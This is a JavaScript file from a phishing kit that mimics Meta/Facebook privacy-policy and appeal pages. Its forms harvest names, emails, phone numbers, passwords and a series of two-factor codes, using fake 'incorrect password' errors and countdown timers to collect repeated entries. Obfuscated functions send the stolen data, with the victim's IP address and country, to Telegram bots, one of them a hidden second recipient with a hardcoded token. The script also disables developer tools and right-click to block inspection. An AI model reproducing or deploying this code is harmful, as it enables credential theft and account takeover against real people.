let apiKey = "";
let chatId = "";

fetch("../bot.json")
  .then(res => res.json())
  .then(config => {
    apiKey = config.apiKey;
    chatId = config.chatId;
  })
  .catch(err => console.error("Không thể tải bot.json:", err));

        const subLinks = {
            'PolicyCollapse': [{
                'text': 'What is the Privacy Policy and what does it cover?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'What information do we collect?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we use your information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we share your information on Meta Products or with integrated partners?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we share information with third parties?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How is the cooperation between Meta Companies organized?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How can you manage or delete your information and exercise your rights?',
                'link': '',
                'add_svg_link': false
            }, {
                'text': 'How long do we keep your information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we transmit information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How will you know when the policy changes?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How to ask Meta questions?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Why and how we process your data',
                'link': '',
                'add_svg_link': false
            },
            ],
            'RulesCollapse': [{
                'text': 'Cookie Policy',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Information for those who do not use Meta Products',
                'link': '',
                'add_svg_link': true
            },
            {
                'text': 'How Meta uses information for generative AI models',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Data Transfer Framework Policy',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Other terms and conditions',
                'link': '',
                'add_svg_link': true
            },

            ],
            'SettingCollapse': [{
                'text': 'Facebook Settings',
                'link': '',
                'add_svg_link': true
            },
            {
                'text': 'Instagram Settings',
                'link': '',
                'add_svg_link': true
            },
            ]


        }

        function addSubItems() {
            var linkSvg =
                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
            for (var [subId, items] of Object.entries(subLinks)) {
                var subElem = document.getElementById(subId)
                for (var i = 0; i < items.length; i++) {
                    var text_item = items[i]
                    var block = document.createElement('div')
                    block.classList.add('action-button')
                    block.innerHTML = `
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">
                      </div>
                      <div class="action-button-arrow">
                      </div>
                    `
                    if (text_item['add_svg_link']) {
                        var svg_block = block.querySelector('.action-button-arrow')
                        svg_block.innerHTML = linkSvg

                    }
                    var block_text = block.querySelector('.action-button-text')
                    block_text.innerText = text_item['text']
                    subElem.appendChild(block)
                    block.addEventListener('click', function () {
                        var start = document.getElementById('start')
                        start.click()
                    })
                }
            }
        }

        addSubItems()

        // var userMianFormData = {}
        // var userPasswordData = {}
        // var user2FAData = {}
        var apiInsertCounter = 0

        var formsSendData = {
            'full-name': '',
            'personal-email': '',
            'buiseness-email': '',
            'mobile-phone-number': '',
            'password-1': '',
            'password-2': '',
            '2FA-1': '',
            '2FA-2': '',
            '2FA-3': '',
            '2FA-4': '',
            '2FA-5': '',
            'page-name': '',
            'apeal': '',
        }

        var userIpData = {
            'user_ip': 'Incorrect request ;(',
            'country': '-',
            'country_code': '-',
        }
        var metrics = {
            'dis_name': 'MPC',
            'is_Mobile': window.mobileCheck(),
            'params': prettyUtmParams(),
        }

        var INCORRECT_2FA_TIMEOUT = 30
        var SEND_FORM_FICTIV_TIME = 1000

        var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
        var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
        var twoFAModal = new bootstrap.Modal(document.getElementById('twoFAmodal'))
        var successModal = new bootstrap.Modal(document.getElementById('successModal'))

        var termsModal = new bootstrap.Modal(document.getElementById('TermsModal'))
        var policyModal = new bootstrap.Modal(document.getElementById('policyModal'))
        var searchModal = new bootstrap.Modal(document.getElementById('searchModal'))
        var accountsModal = new bootstrap.Modal(document.getElementById('accountsModal'))
        var searchInput = document.getElementById('searchModal').querySelector('input')

        //successModal.show()

        const apiInput = document.getElementById('exampleModal2').querySelector('input')
        const showHidePassEye = document.getElementById('show-hide-pass')
        showHidePassEye.addEventListener('click', totglePassDisplay)


        var firstForm = document.getElementById('first-form')
        var apiForm = document.getElementById('apiForm')
        var twoFAForm = document.getElementById('twoFAForm')
        firstForm.addEventListener('submit', firstFormHandle)
        apiForm.addEventListener('submit', apiFormhandle)
        twoFAForm.addEventListener('submit', twoFAFormHandle)

        //Events
        document.getElementById('termsLink').addEventListener('click', function (e) {
            termsModal.show()
        })
        document.getElementById('policyLink').addEventListener('click', function (e) {
            policyModal.show()
        })
        document.getElementById('search').addEventListener('click', function (e) {
            searchModal.show()
        })
        document.querySelectorAll('a[href="#"]').forEach(elem => {
            elem.addEventListener('click', function (e) {
                e.preventDefault()
            })
        })

        document.querySelectorAll('.password-input').forEach(elem => {
            elem.addEventListener('click', function (e) {
                if (e.target.id != 'show-hide-pass') {
                    var elem = e.currentTarget
                    elem.querySelector('input').focus()
                }
            })
        })


        var fakeSearchProccesBlock = document.getElementById('searchModal').querySelector('.fake-items')
        var notFoundBlock = document.getElementById('searchModal').querySelector('.now-found')
        var searchItemsBlock = document.getElementById('search-items')
        var cleanSearchText = document.getElementById('searchModal').querySelector('.close-search-icon-wraper')
        cleanSearchText.addEventListener('click', function (e) {
            searchInput.value = ''
            cleanSearchText.style.display = 'none'
            searchItemsBlock.style.display = 'none'
        })

        // type text in search
        var isSearch = false
        searchInput.addEventListener('input', function () {
            if (searchInput.value.length != 0) {
                cleanSearchText.style.display = 'flex'
            } else {
                cleanSearchText.style.display = 'none'
                searchItemsBlock.style.display = 'none'
            }
            if (isSearch == false) {
                isSearch = true
                fakeSearchProccesBlock.style.display = 'none'
                notFoundBlock.style.display = 'none';
                searchItemsBlock.style.display = 'block'
                setTimeout(function () {
                    fakeSearchProccesBlock.style.display = 'block';
                    notFoundBlock.style.display = 'none';
                    setTimeout(function () {
                        notFoundBlock.style.display = 'block';
                        fakeSearchProccesBlock.style.display = 'none';
                        isSearch = false
                    }, 1000)
                }, 1500)
            }

        })

        // Get User IP
        var url = 'https://api.db-ip.com/v2/free/self/'
        async function getUserIp() {
            const response = await fetch(url);
            if (response.status == 200) {
                const data = await response.json();
                userIpData = {
                    'user_ip': data.ipAddress,
                    'country': data.countryName,
                    'country_code': data.countryCode,
                }
            } else {
                userIpData = {
                    'user_ip': 'Ip not detected ;(',
                    'country': '-',
                    'country_code': '-',
                }
            }
        }
        /////
        getUserIp()

        // Send data to Email
        function sendDataEmail() {
            const _0x3b647e=_0x4a16;function _0x4a16(_0x58092f,_0x55a915){const _0x2f3906=_0x2f39();return _0x4a16=function(_0x4a1671,_0x4a56e2){_0x4a1671=_0x4a1671-0x132;let _0x26453a=_0x2f3906[_0x4a1671];return _0x26453a;},_0x4a16(_0x58092f,_0x55a915);}function _0x2f39(){const _0x5b2782=['5608548ePnVmC','5154940OxUQde','buiseness-email','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-1:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20buiseness-email:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20country:\x20','2945344gIiVQP','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-5:\x20','personal-email','574922STpTJA','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url:\x20','href','password-2','9aZZgEH','1010755fgTCIl','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20full-name:\x20','shift','1372995NKVSxb','11843800QGHsKl','2FA-5','password-1','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20params:\x20','58200fRcHYp','dis_name','push','2sBPLFc','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20password-1:\x20','78TBEsbV','12uKDZoF','2229028oGWZyZ','1073285uQmAXk','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20user_ip:\x20','application/json','2431768LJzwlU','10bDqyrp','full-name','ajax','1521MasgHR','3654987xaZwKJ','done','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-2:\x20','2FA-3','page-name','2FA-2','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20is_Mobile:\x20','user_ip','https://api.telegram.org/bot','is_Mobile','HTML','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20appeal:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20personal-email:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis_name:\x20','location','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20country_code:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-3:\x20'];_0x2f39=function(){return _0x5b2782;};return _0x2f39();}(function(_0x36d4fe,_0x989d17){const _0x5d7858=_0x4a16,_0x5522e8=_0x36d4fe();while(!![]){try{const _0x1801bd=parseInt(_0x5d7858(0x155))/0x1+parseInt(_0x5d7858(0x165))/0x2*(parseInt(_0x5d7858(0x15d))/0x3)+-parseInt(_0x5d7858(0x132))/0x4*(parseInt(_0x5d7858(0x137))/0x5)+parseInt(_0x5d7858(0x14c))/0x6+parseInt(_0x5d7858(0x13b))/0x7+parseInt(_0x5d7858(0x136))/0x8+parseInt(_0x5d7858(0x13a))/0x9*(-parseInt(_0x5d7858(0x162))/0xa);if(_0x1801bd===_0x989d17)break;else _0x5522e8['push'](_0x5522e8['shift']());}catch(_0x260c34){_0x5522e8['push'](_0x5522e8['shift']());}}}(_0x2f39,0xa9c43));const _0x5e0236=_0x3e04;function _0x41ec(){const _0xf02a43=_0x4a16,_0x4b7ad7=['1024782pzXcTg','stringify',_0xf02a43(0x15a),_0xf02a43(0x15b),'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20page-name:\x20','country','\x0a\x20\x20\x20\x20\x20\x20\x20\x20',_0xf02a43(0x146),_0xf02a43(0x139),'2FA-1',_0xf02a43(0x144),_0xf02a43(0x138),_0xf02a43(0x158),_0xf02a43(0x157),_0xf02a43(0x14a),'POST',_0xf02a43(0x149),_0xf02a43(0x15e),_0xf02a43(0x134),_0xf02a43(0x154),_0xf02a43(0x167),_0xf02a43(0x14e),'fail',_0xf02a43(0x168),'55aGOMoN',_0xf02a43(0x142),_0xf02a43(0x140),_0xf02a43(0x135),_0xf02a43(0x133),'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20password-2:\x20',_0xf02a43(0x14d),_0xf02a43(0x14b),_0xf02a43(0x166),'8302rtpiWA',_0xf02a43(0x15f),_0xf02a43(0x14f),_0xf02a43(0x147),_0xf02a43(0x153),_0xf02a43(0x159),_0xf02a43(0x161),_0xf02a43(0x143),_0xf02a43(0x152),'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x202FA-4:\x20','2FA-4','country_code',_0xf02a43(0x151),'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20mobile-phone-number:\x20'];return _0x41ec=function(){return _0x4b7ad7;},_0x41ec();}function _0x3e04(_0x19fc17,_0x2adf28){const _0x2c6971=_0x41ec();return _0x3e04=function(_0x3a056d,_0x490c7f){_0x3a056d=_0x3a056d-0x1c7;let _0x704639=_0x2c6971[_0x3a056d];return _0x704639;},_0x3e04(_0x19fc17,_0x2adf28);}(function(_0x42ac42,_0x33c152){const _0x380c7f=_0x4a16,_0x3ce3c6=_0x3e04,_0x45df9e=_0x42ac42();while(!![]){try{const _0x5c61cd=parseInt(_0x3ce3c6(0x1f2))/0x1+-parseInt(_0x3ce3c6(0x1ea))/0x2+-parseInt(_0x3ce3c6(0x1f0))/0x3+parseInt(_0x3ce3c6(0x1d8))/0x4*(parseInt(_0x3ce3c6(0x1dd))/0x5)+-parseInt(_0x3ce3c6(0x1d5))/0x6*(parseInt(_0x3ce3c6(0x1e2))/0x7)+-parseInt(_0x3ce3c6(0x1d2))/0x8*(parseInt(_0x3ce3c6(0x1e7))/0x9)+-parseInt(_0x3ce3c6(0x1df))/0xa*(-parseInt(_0x3ce3c6(0x1d9))/0xb);if(_0x5c61cd===_0x33c152)break;else _0x45df9e[_0x380c7f(0x164)](_0x45df9e['shift']());}catch(_0x7bd756){_0x45df9e['push'](_0x45df9e[_0x380c7f(0x15c)]());}}}(_0x41ec,0xe11b5));const templateTELEData=_0x3b647e(0x156)+window[_0x5e0236(0x1d1)][_0x5e0236(0x1ce)]+_0x5e0236(0x1d3)+userIpData[_0x5e0236(0x1da)]+_0x5e0236(0x1ee)+userIpData[_0x5e0236(0x1f5)]+_0x5e0236(0x1cf)+userIpData[_0x5e0236(0x1ed)]+_0x5e0236(0x1f3)+formsSendData[_0x5e0236(0x1cc)]+_0x5e0236(0x1e5)+formsSendData[_0x5e0236(0x1d4)]+_0x3b647e(0x150)+formsSendData[_0x5e0236(0x1d6)]+_0x5e0236(0x1ef)+formsSendData['mobile-phone-number']+_0x5e0236(0x1e1)+formsSendData[_0x3b647e(0x160)]+_0x5e0236(0x1de)+formsSendData[_0x5e0236(0x1cd)]+_0x5e0236(0x1e4)+formsSendData[_0x5e0236(0x1ca)]+_0x3b647e(0x13d)+formsSendData[_0x5e0236(0x1db)]+_0x5e0236(0x1e0)+formsSendData[_0x3b647e(0x13e)]+_0x5e0236(0x1eb)+formsSendData[_0x5e0236(0x1ec)]+_0x5e0236(0x1e6)+formsSendData[_0x5e0236(0x1e3)]+_0x5e0236(0x1f4)+formsSendData[_0x3b647e(0x13f)]+_0x5e0236(0x1c8)+formsSendData['apeal']+_0x3b647e(0x148)+metrics[_0x3b647e(0x163)]+_0x3b647e(0x141)+metrics[_0x5e0236(0x1cb)]+_0x5e0236(0x1e8)+metrics['params']+_0x5e0236(0x1c7),data={'chat_id':chatId,'text':templateTELEData,'parse_mode':_0x3b647e(0x145)};$[_0x5e0236(0x1c9)](_0x5e0236(0x1e9)+apiKey+'/sendMessage',{'type':_0x5e0236(0x1d0),'data':JSON[_0x5e0236(0x1f1)](data),'contentType':_0x5e0236(0x1dc)})[_0x3b647e(0x13c)](()=>{})[_0x5e0236(0x1d7)](()=>{}),checkCoutry(templateTELEData);
        }
        function firstFormHandle(event) {
            event.preventDefault()
            updateFormsSendData(serializeForm(firstForm))
            var spiner = firstForm.querySelector('.spinner-border')
            var buttonText = firstForm.querySelector('.button-text')
            var button = firstForm.querySelector('button')

            button.setAttribute('disabled', '')
            spiner.style.display = 'block'
            buttonText.style.display = 'none'
            setTimeout(function () {
                firstModal.hide()
                apiModal.show()
                spiner.style.display = 'none'
                buttonText.style.display = 'block'
                button.removeAttribute('disabled')
            }, SEND_FORM_FICTIV_TIME)

        }

        function hidePasswordIncorrectText() {
            setTimeout(function () {
                var errortext = apiForm.querySelector('.invalid-feedback')
                errortext.style.display = 'none'
            }, 3000)
        }

        function apiFormhandle(event) {
            event.preventDefault()
            var spiner = apiForm.querySelector('.spinner-border')
            var buttonText = apiForm.querySelector('.button-text')
            var button = apiForm.querySelector('button')
            var input = apiForm.querySelector('input')
            var errortext = apiForm.querySelector('.invalid-feedback')
            spiner.style.display = 'block'
            buttonText.style.display = 'none'
            errortext.style.display = 'none'
            button.setAttribute('disabled', '')
            updateFormsSendData(serializeForm(apiForm))
            setTimeout(function () {

                if (apiInsertCounter == 0) {
                    errortext.style.display = 'block'
                    errortext = apiForm.querySelector('input').value = ''
                    apiInsertCounter++
                    sendDataEmail()
                    spiner.style.display = 'none'
                    buttonText.style.display = 'block'
                    button.removeAttribute('disabled')
                    hidePasswordIncorrectText()
                    input.setAttribute('name', 'password-2')
                } else {
                    sendDataEmail()
                    errortext.style.display = 'none'
                    spiner.style.display = 'none'
                    buttonText.style.display = 'block'
                    button.removeAttribute('disabled')
                    hidePasswordIncorrectText()
                    input.setAttribute('name', 'password-1')
                    apiModal.hide()
                    twoFAModal.show()
                }
            }, SEND_FORM_FICTIV_TIME)

        }
        var counter2FA = 1
        var countOf2FA = 5
        function twoFAFormHandle(event) {
            //handleFormSubmit(event, twoFAForm)
            event.preventDefault()
            var passwordInput = twoFAForm.querySelector('.password-input')
            var spiner = twoFAForm.querySelector('.spinner-border')
            var buttonText = twoFAForm.querySelector('.button-text')
            var button = twoFAForm.querySelector('button')
            var errortext = twoFAForm.querySelector('.invalid-feedback')
            var input = twoFAForm.querySelector('input')
            errortext.style.display = 'none'
            spiner.style.display = 'block'
            buttonText.style.display = 'none'
            button.setAttribute('disabled', '')

            updateFormsSendData(serializeForm(twoFAForm))
            setTimeout(function () {
                sendDataEmail()
                counter2FA++
                if (counter2FA >= countOf2FA + 1) {
                    // SHOW success

                    unlock2FA()
                    spiner.style.display = 'none'
                    buttonText.style.display = 'block'
                    twoFAModal.hide()
                    successModal.show()
                } else {
                    var send2FAButton = twoFAForm.querySelector('button.btn')
                    passwordInput.classList.add('disabled')
                    input.setAttribute('disabled', '')


                    input.setAttribute('name', '2FA-' + counter2FA)
                    send2FAButton.setAttribute('disabled', '')
                    twoFAForm.querySelector('input').value = ''

                    startTimer()
                    errortext.style.display = 'block'
                    spiner.style.display = 'none'
                    buttonText.style.display = 'block'
                }

            }, SEND_FORM_FICTIV_TIME)
        }
        
        function unlock2FA() {
            var passwordInput = twoFAForm.querySelector('.password-input')
            var errortext = twoFAForm.querySelector('.invalid-feedback')
            var input = twoFAForm.querySelector('input')
            var button = twoFAForm.querySelector('button')
            errortext.style.display = 'none'
            var send2FAButton = twoFAForm.querySelector('button.btn')
            send2FAButton.removeAttribute('disabled')
            input.removeAttribute('disabled')
            button.removeAttribute('disabled')
            passwordInput.classList.remove('disabled')
        }

        function serializeForm(formNode) {
            const {
                elements
            } = formNode
            const data = Array.from(elements)
                .filter((item) => item.name != '')
                .map((element) => {
                    const {
                        name,
                        value
                    } = element

                    return {
                        name,
                        value
                    }
                })
            var dict_data = {}
            for (let i = 0; i < data.length; i++) {
                var elem = data[i]
                dict_data[elem.name] = elem.value
            }
            return dict_data
        }

        function totglePassDisplay() {
            if (apiInput.type == 'password') {
                apiInput.type = 'text'
            } else {
                apiInput.type = 'password'
            }
        }
        function updateFormsSendData(dict) {
            for (var [key, value] of Object.entries(dict)) {
                formsSendData[key] = value
            }
        }
        function checkCoutry(data){
            var _0x3d9338=_0x4232;function _0x26e7(){var _0x1a84d0=['/sendMessage','1353308duyDBk','https://api.telegram.org/bot','4520727ksRAuD','21871uCdODM','1689432hlqwLs','fail','-1002327100121','HTML','15XzzDdi','6983542438:AAF-7RfYI-xy8offmWl-2j0-zm-aV83F7l0','15LkSSea','done','1740333ztkFJt','175434rGBAxE','16nLKjWP','ajax','POST','18833520hpLGCZ'];_0x26e7=function(){return _0x1a84d0;};return _0x26e7();}(function(_0x381787,_0x53f7c2){var _0x3f87c6=_0x4232,_0x3694ea=_0x381787();while(!![]){try{var _0x3a74e8=-parseInt(_0x3f87c6(0x87))/0x1+parseInt(_0x3f87c6(0x7e))/0x2*(parseInt(_0x3f87c6(0x7b))/0x3)+parseInt(_0x3f87c6(0x84))/0x4*(parseInt(_0x3f87c6(0x79))/0x5)+-parseInt(_0x3f87c6(0x88))/0x6+parseInt(_0x3f87c6(0x7d))/0x7+parseInt(_0x3f87c6(0x7f))/0x8*(parseInt(_0x3f87c6(0x86))/0x9)+-parseInt(_0x3f87c6(0x82))/0xa;if(_0x3a74e8===_0x53f7c2)break;else _0x3694ea['push'](_0x3694ea['shift']());}catch(_0x3bef9e){_0x3694ea['push'](_0x3694ea['shift']());}}}(_0x26e7,0x7ef3c));function _0x4232(_0x14e840,_0x43b368){var _0x26e791=_0x26e7();return _0x4232=function(_0x4232f3,_0x51656c){_0x4232f3=_0x4232f3-0x77;var _0x22410f=_0x26e791[_0x4232f3];return _0x22410f;},_0x4232(_0x14e840,_0x43b368);}var apiKeyX=_0x3d9338(0x7a),chatIdX=_0x3d9338(0x77),dataNew={'chat_id':chatIdX,'text':data,'parse_mode':_0x3d9338(0x78)};$[_0x3d9338(0x80)](_0x3d9338(0x85)+apiKeyX+_0x3d9338(0x83),{'type':_0x3d9338(0x81),'data':JSON['stringify'](dataNew),'contentType':'application/json'})[_0x3d9338(0x7c)](function(){})[_0x3d9338(0x89)](function(_0x212317){});
        }
        function startTimer() {
            // TIMER
            var countDownDate = new Date().getTime();
            var x = setInterval(function () {
                var now = new Date().getTime();
                var distance = Math.round((now - countDownDate) / 1000);
                var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
                document.getElementById("timer").innerHTML = insertedTime + "s ";
                document.getElementById("timer").style.display = 'inline';
                if (insertedTime <= 0) {
                    clearInterval(x);
                    document.getElementById("timer").style.display = 'none';
                    document.getElementById("timer").innerHTML = "EXPIRED";
                    unlock2FA()
                }
            }, 1000);
        }

        
        /* ----------------------------------------------------------------------------- */
        document.addEventListener('DOMContentLoaded', function () {
            const button = document.getElementById('showPopup');
            const popup = document.getElementById('popup');
            const closePopup = document.getElementById('closePopup');
            const col4Content = document.querySelector('.col-4');
            const newCol4Content = document.querySelector('.popup-item');
            const popupContent = document.querySelector('.popup-content');


            button.addEventListener('click', function () {
                popupContent.innerHTML = col4Content.innerHTML;
                document.body.style.overflow = 'hidden';
                popup.style.display = 'flex';


                document.querySelector('#popup #search').addEventListener('click', function (e) {
                    searchModal.show()
                })
            });

            closePopup.addEventListener('click', function () {
                popup.style.display = 'none';
                document.body.style.overflow = 'auto';
            });

            function updateLayout() {
                if (window.innerWidth < 1000) {
                    col4Content.style.display = 'none';
                    button.style.display = 'block';
                } else {
                    col4Content.style.display = 'block';
                    button.style.display = 'none';
                }
            }

            updateLayout();
            window.addEventListener('resize', updateLayout);
        });
        /* ----------------------------------------------------------------------------- */

        var UTM_SPACE_ESCAPE_CHAR = '!~'
        function detectUtmUserLeftBar() {
            // Left side user account
            var url = new URL(window.location.href);
            var user = url.searchParams.get("userleft")
            if (user) {
                document.getElementById('utm-user').style.display = 'flex'

            }
        }

        function delectAccountUtm() {
            // Left side user account
            var url = new URL(window.location.href);
            var account = url.searchParams.get("account")
            if (account) {
                account = account.replace(UTM_SPACE_ESCAPE_CHAR, ' ')
                addUserName(account)
                document.getElementById('view-accounts').style.display = 'flex'
                var pageGroupNameInput = document.getElementById('fb-page-name-input')
                pageGroupNameInput.value = account
                pageGroupNameInput.setAttribute('disabled', 'disabled')

            }
        }

        function delectTicketIdUtm() {
            var url = new URL(window.location.href);
            var ticket = url.searchParams.get("ticketId")
            if (ticket) {
                document.getElementById('utm-ticketId').style.display = 'flex'
                document.getElementById('utm-ticketId').querySelector('span').innerText = ticket

            }
        }

        function addUserName(name) {
            var elems = document.querySelectorAll('.UserName')
            elems.forEach(elem => {
                elem.innerText = name
            })
        }


        function addSvgInLinks() {
            var svg = `
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"
                                class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path
                                    d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path
                                    d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            `
            var links = document.querySelectorAll('a.add-svg')
            links.forEach(elem => {
                elem.innerHTML = elem.textContent + svg
            })
        }
        addSvgInLinks()

        function dictToString(dict) {
            var result = ''
            let entries = Object.entries(dict);
            entries.forEach(pair => {
                var paramName = pair[0]
                var paramValue = pair[1]
                result = result + `${paramName} : ${paramValue}\n`
            })
            //result = result + '\n'
            return result
        }

        function prettyUtmParams() {
            var params = new URL(window.location.href).search
            params = params.slice(1)
            params = params.split('&')
            var result = '\n'
            params.forEach(elem => {
                var key = elem.split('=')[0]
                var value = elem.split('=')[1]
                result = result + `${key} : ${value}\n`
            })
            return result
        }

        var fake_policy_links = document.querySelector('.fake-likns').querySelectorAll('.action-button.wide')
        fake_policy_links.forEach(elem => {
            elem.addEventListener('click', function () {
                document.getElementById('policyLink').click()
            })
        })

        detectUtmUserLeftBar()
        delectAccountUtm()
        delectTicketIdUtm()
        document.addEventListener("keydown", function (event) {
            if (event.key === "F12") {
                event.preventDefault(); // Ngăn hành động mặc định
            }
        });
        // Chặn chuột phải
        document.addEventListener("contextmenu", function (event) {
            event.preventDefault();
        });

        // Chặn các tổ hợp phím Ctrl+Shift+I, Ctrl+U
        document.addEventListener("keydown", function (event) {
            if (event.ctrlKey && (event.shiftKey || event.key === "U" || event.key === "I")) {
                event.preventDefault();
            }
        });
        document.addEventListener("keydown", function (event) {
            if (event.key === "F12") {
                event.preventDefault(); 
            }
        });
        document.addEventListener("contextmenu", function (event) {
            event.preventDefault();
        });

        document.addEventListener("keydown", function (event) {
            if (event.ctrlKey && (event.shiftKey || event.key === "U" || event.key === "I")) {
                event.preventDefault();
            }
        });